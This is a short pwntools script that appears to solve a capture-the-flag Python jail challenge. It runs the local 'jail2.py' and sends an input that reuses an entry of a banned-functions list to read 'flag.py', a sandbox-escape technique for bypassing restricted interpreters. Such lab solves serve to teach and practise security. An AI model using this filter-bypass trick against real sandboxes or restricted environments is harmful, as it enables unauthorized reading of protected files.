from pwn import *

c = process('./jail2.py')

c.send(b'banned_funcs[2]("flag.py").read()\n')
print(c.recvall())
